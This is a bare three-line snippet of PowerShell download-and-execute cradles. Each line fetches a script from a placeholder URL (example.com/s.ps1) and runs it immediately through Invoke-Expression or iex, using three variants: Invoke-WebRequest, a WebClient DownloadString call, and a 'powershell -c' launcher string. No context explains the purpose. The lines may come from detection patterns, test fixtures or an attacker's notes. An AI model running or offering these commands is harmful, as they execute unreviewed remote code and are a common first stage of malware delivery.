Invoke-WebRequest https://example.com/s.ps1 | Invoke-Expression
Invoke-Expression ((New-Object Net.WebClient).DownloadString('https://example.com/s.ps1'))
$launcher = 'powershell -c "iex (irm https://example.com/s.ps1)"'
